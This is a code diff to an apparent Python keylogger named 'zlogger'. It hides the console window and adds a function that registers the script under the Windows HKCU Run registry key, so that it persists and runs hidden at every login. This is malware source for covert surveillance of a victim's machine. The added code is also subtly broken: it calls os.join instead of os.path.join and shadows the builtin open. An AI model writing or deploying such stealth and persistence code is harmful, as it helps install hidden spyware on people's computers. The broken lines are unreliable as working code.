@@ -10,6 +10,7 @@ import base64
 import socketserver
 import platform
 
+
 # get the user name as identifier
 def user_name():
     user_name = str(socket.gethostname())
@@ -33,11 +34,29 @@ def dir_path():
     return dir_path
 
 # #this hide function help to minimize the console
-def hide():
+def hide_console():
     import win32console,win32gui
     window = win32console.GetConsoleWindow()
     win32gui.ShowWindow(window,0)
     return True
+
+
+def add_startup():
+    # in python __file__ is the instant of file path where it was executed
+    pth = os.path.dirname(os.path.realpath(__file__))
+    # name of the python file with extension
+    s_name="zlogger.py"    
+    # joins the file name to end of path address
+    address=os.join(pth,s_name) 
+    # key we want to change is HKEY_CURRENT_USER  key value is Software\Microsoft\Windows\CurrentVersion\Run
+    key = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
+    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
+    # open the key to make changes to
+    open = winreg.OpenKey(key,key_value,0,winreg.KEY_ALL_ACCESS)
+    # modify the opened key
+    winreg.SetValueEx(open,"zlogger",0,winreg.REG_SZ,address)
+    # now close the opened key
+    winreg.CloseKey(open)
 
 # check if internet is connected or not
 def is_connected():
